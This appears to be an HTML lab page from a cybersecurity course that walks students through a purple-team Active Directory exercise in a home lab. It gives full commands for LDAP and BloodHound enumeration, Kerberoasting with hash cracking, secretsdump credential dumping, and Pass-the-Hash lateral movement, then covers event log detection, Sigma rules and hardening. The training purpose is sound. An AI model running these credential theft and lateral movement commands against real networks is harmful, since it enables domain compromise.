@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>L12: Active Directory Attack & AI Defense — CyberSec Pro Academy</title>
+<link rel="stylesheet" href="lab-base.css">
+</head>
+<body>
+<nav>
+  <a href="../index.html" class="nav-logo">CyberSec <span>Pro</span> Academy</a>
+  <div class="nav-links"><a href="labs.html">← All Labs</a><a href="lab-setup.html">Lab Setup</a><a href="../checkout.html" class="nav-cta">Enroll Now</a></div>
+</nav>
+<div class="lab-progress-bar">
+  <span class="lp-label">Lab Progress</span><div class="lp-track"><div class="lp-fill" id="lpFill"></div></div>
+  <span class="lp-pct" id="lpPct">0%</span><span class="lp-steps" id="lpSteps">0 / 13 steps</span>
+</div>
+<div class="lab-layout">
+<div class="lab-guide">
+  <div class="lab-header">
+    <div class="lab-breadcrumb"><a href="labs.html">Labs</a> › <a href="labs.html">Incident Response</a> › L12</div>
+    <div class="lab-num-badge">LAB L12 · ACTIVE DIRECTORY · ADVANCED</div>
+    <h1>Active Directory Attack <em>&amp; AI Defense</em></h1>
+    <p>Build an AD lab, enumerate with BloodHound, execute Kerberoasting and Pass-the-Hash attacks, then use AI to write detection rules from Windows Event Logs and Sigma rules for your SIEM.</p>
+    <div class="lab-meta">
+      <div class="lab-meta-item">⏱ <strong>120 min</strong></div>
+      <div class="lab-meta-item">🖥️ <strong>Kali + Windows Server VM</strong></div>
+      <div class="lab-meta-item">🔧 <strong>Impacket · BloodHound · Mimikatz · Sigma</strong></div>
+      <div class="lab-meta-item">🤖 <strong>AI Detection Engineering</strong></div>
+    </div>
+  </div>
+  <div class="scenario-box scenario-red">
+    <div class="scenario-label">🎯 Red/Blue Team Exercise</div>
+    <p>You're doing a purple team exercise: first play attacker and compromise the AD environment using industry-standard techniques, then switch to defender and build detection rules for everything you just did. The AI Analyst acts as your blue team partner — analyzing attack evidence and writing detection logic.</p>
+  </div>
+
+  <div class="lab-phase">
+    <div class="phase-title-row"><div class="phase-badge">0</div><div><div class="phase-name">Phase 0 — Build the AD Lab</div><div class="phase-desc">Set up Windows Server with Active Directory (or use an existing AD VM)</div></div></div>
+    <div class="steps-list">
+      <div class="step-item" id="step-0" onclick="toggleStep(0)">
+        <div class="step-header"><div class="step-num" data-n="1"></div><div class="step-content"><div class="step-title">Install Windows Server and promote to Domain Controller</div><div class="step-desc">Free 180-day eval from Microsoft Evaluation Center</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">Download Windows Server 2019/2022 evaluation from <strong>microsoft.com/en-us/evalcenter</strong>. Install as a VM, then promote to DC:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># In Windows Server PowerShell (as Administrator):</span><br><span class="k">Install-WindowsFeature AD-Domain-Services -IncludeManagementTools</span><br><span class="k">Install-ADDSForest -DomainName "lab.local" -InstallDns -Force</span><br><span class="c"># Server will reboot. After reboot, create test users:</span><br><span class="k">New-ADUser -Name "alice.johnson" -AccountPassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) -Enabled $true</span><br><span class="k">New-ADUser -Name "bob.smith" -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) -Enabled $true</span><br><span class="k">New-ADGroup -Name "IT_Admins" -GroupScope Global</span><br><span class="k">Add-ADGroupMember "IT_Admins" -Members "alice.johnson"</span></div></div>
+          <div class="alert alert-info"><span class="alert-icon">💡</span><div>Alternatively, use the free <strong>GOAD (Game of Active Directory)</strong> lab: github.com/Orange-Cyberdefense/GOAD — a fully pre-configured vulnerable AD environment via Vagrant.</div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-1" onclick="toggleStep(1)">
+        <div class="step-header"><div class="step-num" data-n="2"></div><div class="step-content"><div class="step-title">Configure Kali to reach the DC and set up Impacket</div><div class="step-desc">Install attack tools and verify connectivity</div></div></div>
+        <div class="step-body">
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># On Kali — both VMs should be on Host-Only network</span><br><span class="k">ping 192.168.56.10</span>   <span class="c"># Windows DC IP — should respond</span><br><span class="k">pip3 install impacket</span><br><span class="k">sudo apt install -y bloodhound neo4j crackmapexec</span><br><span class="c"># Set DNS to the DC (needed for Kerberos)</span><br><span class="k">echo "nameserver 192.168.56.10" | sudo tee /etc/resolv.conf</span><br><span class="k">echo "192.168.56.10 lab.local dc01.lab.local" | sudo tee -a /etc/hosts</span></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-phase">
+    <div class="phase-title-row"><div class="phase-badge">1</div><div><div class="phase-name">Phase 1 — Enumeration (Red Team)</div><div class="phase-desc">Map the domain: users, groups, trusts, and attack paths</div></div></div>
+    <div class="steps-list">
+      <div class="step-item" id="step-2" onclick="toggleStep(2)">
+        <div class="step-header"><div class="step-num" data-n="3"></div><div class="step-content"><div class="step-title">LDAP enumeration with ldapsearch and enum4linux</div><div class="step-desc">Enumerate users, groups, and domain info without credentials</div></div></div>
+        <div class="step-body">
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Anonymous LDAP enumeration</span><br><span class="k">ldapsearch -x -H ldap://192.168.56.10 -b "DC=lab,DC=local" "(objectClass=user)" cn sAMAccountName | tee ldap_users.txt</span><br><span class="k">enum4linux -a 192.168.56.10 | tee enum4linux.txt</span><br><span class="c"># CrackMapExec for quick domain info</span><br><span class="k">crackmapexec smb 192.168.56.10</span></div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-3" onclick="toggleStep(3)">
+        <div class="step-header"><div class="step-num" data-n="4"></div><div class="step-content"><div class="step-title">Run BloodHound to map attack paths</div><div class="step-desc">BloodHound visualizes the shortest path to Domain Admin</div></div></div>
+        <div class="step-body">
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Collect AD data with SharpHound (run on Windows) or bloodhound-python</span><br><span class="k">bloodhound-python -u alice.johnson -p 'Password1!' -d lab.local -ns 192.168.56.10 -c All</span><br><span class="c"># Start Neo4j and BloodHound GUI</span><br><span class="k">sudo neo4j start</span><br><span class="k">bloodhound &</span><br><span class="c"># In BloodHound UI: Upload the JSON files, then run:</span><br><span class="c"># Pre-Built Queries → Find Shortest Paths to Domain Admins</span></div></div>
+          <div class="ai-prompt"><div class="ai-prompt-label">🤖 AI Analyst</div><p>Paste your BloodHound findings (attack paths, kerberoastable users, ACL misconfigurations). The AI will explain each vulnerability, rank by exploitability, and suggest remediation.</p><button class="ai-prompt-btn" onclick="qp('bloodhound')">Ask AI to analyze BloodHound results →</button></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-phase">
+    <div class="phase-title-row"><div class="phase-badge">2</div><div><div class="phase-name">Phase 2 — Exploitation (Red Team)</div><div class="phase-desc">Execute Kerberoasting and Pass-the-Hash attacks</div></div></div>
+    <div class="steps-list">
+      <div class="step-item" id="step-4" onclick="toggleStep(4)">
+        <div class="step-header"><div class="step-num" data-n="5"></div><div class="step-content"><div class="step-title">Kerberoasting — steal service account hashes</div><div class="step-desc">Request Kerberos service tickets and crack them offline</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">Kerberoasting targets accounts with Service Principal Names (SPNs). The TGS ticket is encrypted with the service account's password hash — crack it offline with no lockout risk.</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Find Kerberoastable accounts</span><br><span class="k">impacket-GetUserSPNs lab.local/alice.johnson:'Password1!' -dc-ip 192.168.56.10</span><br><span class="c"># Request TGS tickets and output hashes</span><br><span class="k">impacket-GetUserSPNs lab.local/alice.johnson:'Password1!' -dc-ip 192.168.56.10 -request -output kerberoast_hashes.txt</span><br><span class="c"># Crack with hashcat (mode 13100 = Kerberos TGS)</span><br><span class="k">hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt</span></div></div>
+          <div class="alert alert-warn"><span class="alert-icon">⚠️</span><div>Windows Event ID <strong>4769</strong> (Kerberos service ticket request) logs Kerberoasting. We'll use this in the blue team phase to detect what you just did.</div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-5" onclick="toggleStep(5)">
+        <div class="step-header"><div class="step-num" data-n="6"></div><div class="step-content"><div class="step-title">Pass-the-Hash lateral movement</div><div class="step-desc">Use NTLM hashes to authenticate without knowing the plaintext password</div></div></div>
+        <div class="step-body">
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># If you dumped NTLM hashes (via Mimikatz or secretsdump)</span><br><span class="k">impacket-secretsdump lab.local/alice.johnson:'Password1!'@192.168.56.10</span><br><span class="c"># Pass-the-Hash with a stolen NTLM hash (replace with actual hash)</span><br><span class="k">impacket-psexec lab.local/Administrator@192.168.56.10 -hashes :aad3b435b51404eeaad3b435b51404ee:hash_here</span><br><span class="c"># Or use CrackMapExec for network-wide PtH</span><br><span class="k">crackmapexec smb 192.168.56.0/24 -u Administrator -H :hash_here</span></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-phase">
+    <div class="phase-title-row"><div class="phase-badge">3</div><div><div class="phase-name">Phase 3 — Detection (Blue Team + AI)</div><div class="phase-desc">Find the attacks you just ran in Windows Event Logs and write detection rules</div></div></div>
+    <div class="steps-list">
+      <div class="step-item" id="step-6" onclick="toggleStep(6)">
+        <div class="step-header"><div class="step-num" data-n="7"></div><div class="step-content"><div class="step-title">Query Windows Event Logs for attack evidence</div><div class="step-desc">Find Kerberoasting, PtH, and enumeration in the Security log</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">On the Windows DC (PowerShell), query the Security event log:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Detect Kerberoasting (Event 4769 with RC4 encryption)</span><br><span class="k">Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} | Where-Object {$_.Properties[5].Value -eq '0x17'} | Select TimeCreated,Message | Format-List</span><br><br><span class="c"># Detect Pass-the-Hash (Event 4624 logon type 3 with NTLM)</span><br><span class="k">Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} | Where-Object {$_.Properties[8].Value -eq 3 -and $_.Properties[14].Value -eq 'NTLM'} | Select TimeCreated,Message | Format-List</span><br><br><span class="c"># Detect credential dumping (Event 4657, 4656 on SAM hive)</span><br><span class="k">Get-WinEvent -FilterHashtable @{LogName='Security';Id=4657} | Where-Object {$_.Properties[5].Value -like "*SAM*"}</span></div></div>
+          <div class="ai-prompt"><div class="ai-prompt-label">🤖 AI Analyst — Blue Team Detection</div><p>Paste your Windows Event Log findings. The AI will explain what each event proves, write Sigma detection rules, and generate Splunk SPL queries to detect these attacks in production.</p><button class="ai-prompt-btn" onclick="qp('detect')">Ask AI to write detection rules →</button></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-7" onclick="toggleStep(7)">
+        <div class="step-header"><div class="step-num" data-n="8"></div><div class="step-content"><div class="step-title">AI generates Sigma rules for all three attack techniques</div><div class="step-desc">Vendor-neutral rules deployable to any SIEM</div></div></div>
+        <div class="step-body">
+          <div class="ai-prompt"><div class="ai-prompt-label">🤖 AI Analyst — Sigma Generation</div><p>Ask the AI to write Sigma rules for: 1) Kerberoasting (Event 4769 RC4), 2) Pass-the-Hash (Event 4624 type 3 NTLM), 3) LDAP enumeration, 4) BloodHound collection. Include false positive reduction logic.</p><button class="ai-prompt-btn" onclick="qp('sigma')">Generate all AD attack Sigma rules →</button></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-8" onclick="toggleStep(8)">
+        <div class="step-header"><div class="step-num" data-n="9"></div><div class="step-content"><div class="step-title">Harden the AD environment</div><div class="step-desc">AI recommends specific Group Policy and configuration changes</div></div></div>
+        <div class="step-body">
+          <div class="ai-prompt"><div class="ai-prompt-label">🤖 AI Analyst — AD Hardening</div><p>Describe the vulnerabilities you exploited (weak service account passwords, NTLM enabled, etc.). The AI will provide specific Group Policy settings, PowerShell commands, and architectural changes to harden the environment.</p><button class="ai-prompt-btn" onclick="qp('harden')">Get AI AD hardening recommendations →</button></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-9" onclick="toggleStep(9)">
+        <div class="step-header"><div class="step-num" data-n="10"></div><div class="step-content"><div class="step-title">Install Sysmon for enhanced logging</div><div class="step-desc">Sysmon provides far more detail than standard Windows logging</div></div></div>
+        <div class="step-body">
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Download Sysmon from Microsoft Sysinternals</span><br><span class="k">Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile Sysmon.zip</span><br><span class="k">Expand-Archive Sysmon.zip</span><br><span class="c"># Install with SwiftOnSecurity config (excellent community ruleset)</span><br><span class="k">Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile sysmon-config.xml</span><br><span class="k">.\Sysmon64.exe -accepteula -i sysmon-config.xml</span></div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-10" onclick="toggleStep(10)">
+        <div class="step-header"><div class="step-num" data-n="11"></div><div class="step-content"><div class="step-title">Re-run attacks and verify detection</div><div class="step-desc">Confirm your Sigma rules and Sysmon catch the attacks</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">Repeat the Kerberoasting and Pass-the-Hash attacks from Kali. Then check: do your Sigma rules fire in Splunk? Does Sysmon capture the malicious activity in Event ID 1 (process create) and Event ID 3 (network connection)?</div>
+        </div>
+      </div>
+      <div class="step-item" id="step-11" onclick="toggleStep(11)">
+        <div class="step-header"><div class="step-num" data-n="12"></div><div class="step-content"><div class="step-title">Generate the purple team report</div><div class="step-desc">Document attacks, detection gaps, and recommended controls</div></div></div>
+        <div class="step-body">
+          <div class="ai-prompt"><div class="ai-prompt-label">🤖 AI Analyst</div><p>Share your attack summary and detection results. The AI will write a purple team report covering: attacks executed, detection coverage (what you detected vs missed), risk ratings, and a prioritized remediation roadmap.</p><button class="ai-prompt-btn" onclick="qp('report')">Draft purple team report →</button></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-12" onclick="toggleStep(12)">
+        <div class="step-header"><div class="step-num" data-n="13"></div><div class="step-content"><div class="step-title">Lab complete</div><div class="step-desc">Review key takeaways from the red/blue exercise</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">✅ AD environment built with users and groups<br>✅ BloodHound enumeration completed and attack paths mapped<br>✅ Kerberoasting executed and hashes cracked<br>✅ Pass-the-Hash lateral movement demonstrated<br>✅ Windows Event Logs analyzed for attack evidence<br>✅ Sigma rules written for all three techniques<br>✅ Sysmon deployed with community config<br>✅ Purple team report drafted</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="next-lab"><h4>Next: Lab L13 — Memory Forensics with Volatility</h4><p>Apply Volatility forensics to a realistic compromised memory image.</p><a href="lab-memory-forensics.html">Start L13 →</a></div>
+</div>
+
+<div class="ai-sidebar">
+  <div class="ai-header"><div class="ai-avatar">🤖</div><div><div class="ai-name">CyberSec AI Analyst</div><div class="ai-status" id="aiStatus">L12 — AD Attack/Defense Mode</div></div></div>
+  <div class="ai-context-chip"><strong>Lab Context:</strong> Active Directory purple team — Kerberoasting, Pass-the-Hash, BloodHound enumeration (red), Windows Event Log detection and Sigma rule writing (blue).</div>
+  <div class="api-mini-banner" id="apiBanner" onclick="openApiModal()"><p><strong>→ Connect AI Analyst</strong> — add your Claude API key</p></div>
+  <div class="ai-chat" id="aiChat"></div>
+  <div class="quick-actions">
+    <div class="quick-label">Actions</div>
+    <div class="quick-btns">
+      <button class="quick-btn" onclick="qp('bloodhound')">Analyze BloodHound</button>
+      <button class="quick-btn" onclick="qp('detect')">Write Detections</button>
+      <button class="quick-btn" onclick="qp('sigma')">Write Sigma Rules</button>
+      <button class="quick-btn" onclick="qp('harden')">Harden AD</button>
+      <button class="quick-btn" onclick="qp('explain')">Explain Attack</button>
+      <button class="quick-btn" onclick="qp('report')">Purple Team Report</button>
+    </div>
+  </div>
+  <div class="ai-input-area"><div class="input-row"><textarea class="ai-textarea" id="aiInput" placeholder="Paste BloodHound paths, event logs, attack output, or ask for help..." onkeydown="handleKey(event)"></textarea><button class="send-btn" id="sendBtn" onclick="sendMessage()">➤</button></div></div>
+</div>
+</div>
+
+<div class="modal-overlay" id="apiModal"><div class="modal"><h3>Connect AI Analyst</h3><p>Enter your Anthropic API key. Stored locally only.</p><input type="password" class="modal-input" id="apiKeyInput" placeholder="sk-ant-..."><div class="modal-note">Get your key at console.anthropic.com.</div><div class="modal-btns"><button class="modal-skip" onclick="closeApiModal()">Skip</button><button class="modal-save" onclick="saveKey()">Connect →</button></div></div></div>
+
+<script src="lab-common.js"></script>
+<script>
+initLab({
+  id: 'L12', totalSteps: 13, modeLabel: 'AD Attack/Defense Mode',
+  welcomeMsg: "I'm your purple team analyst for Lab L12. I cover both sides:\n**Red:** BloodHound path analysis, Kerberoasting/PtH execution guidance\n**Blue:** Windows Event Log interpretation, Sigma rule writing, AD hardening\n\nPaste any tool output or event logs and I'll provide attack/defense context.",
+  systemPrompt: `You are a senior red/blue team analyst and Active Directory security expert helping with Lab L12: Active Directory Attack and AI Defense.
+
+Red team coverage: Explain and guide Kerberoasting, Pass-the-Hash, BloodHound enumeration, LDAP recon, credential dumping with Impacket and secretsdump.
+
+Blue team coverage: Interpret Windows Event IDs (4769, 4624, 4625, 4657, 4688, 7045), write Sigma detection rules in YAML, generate Splunk/Elastic SPL queries, recommend AD hardening (GPO settings, Kerberos AES enforcement, Protected Users group, LAPS, tiered admin model).
+
+When analyzing event logs, identify the exact Event IDs that prove each attack occurred and explain what fields to examine. When writing Sigma rules, include false positive reduction conditions.`,
+  quickPrompts: {
+    bloodhound: "Here are my BloodHound findings for the lab.local domain:\n\n[PASTE BLOODHOUND PATH/FINDINGS]\n\nPlease: 1) Explain each attack path and how exploitable it is, 2) Identify the highest-value targets, 3) Suggest remediation for each vulnerability.",
+    detect: "Here are my Windows Event Log entries from running Kerberoasting and Pass-the-Hash:\n\n[PASTE EVENT LOG OUTPUT]\n\nPlease: 1) Confirm which events prove each attack, 2) Identify what fields are most useful for detection, 3) Suggest detection thresholds.",
+    sigma: "Please write Sigma rules (YAML) for all three attacks I executed:\n1. Kerberoasting (look for Event 4769 with RC4/DES encryption type)\n2. Pass-the-Hash (Event 4624 type 3 with NTLM auth)\n3. LDAP enumeration (high volume of 4661 events)\n\nInclude false positive conditions for each.",
+    harden: "My AD lab has these vulnerabilities:\n- Service accounts with weak passwords and SPNs\n- NTLM v1/v2 enabled domain-wide\n- No LAPS deployed\n- Admins logging into workstations\n\nPlease provide specific Group Policy settings, PowerShell commands, and architecture changes to fix each one.",
+    explain: "Please explain the Kerberoasting attack from a technical perspective:\n- How does Kerberos ticket request work?\n- Why can any domain user request service tickets?\n- Why can't Microsoft simply fix this?\n- What defenses actually work?",
+    report: "Please write a purple team exercise report for our AD assessment:\nDomain: lab.local\nAttacks executed: Kerberoasting, Pass-the-Hash, BloodHound\nDetections that fired: [LIST]\nDetections that missed: [LIST]\nVulnerabilities found: [LIST]\n\nInclude: Executive Summary, Attack Narrative, Detection Coverage Matrix, Risk Ratings, Remediation Roadmap."
+  }
+});
+</script>
+</body>
+</html>
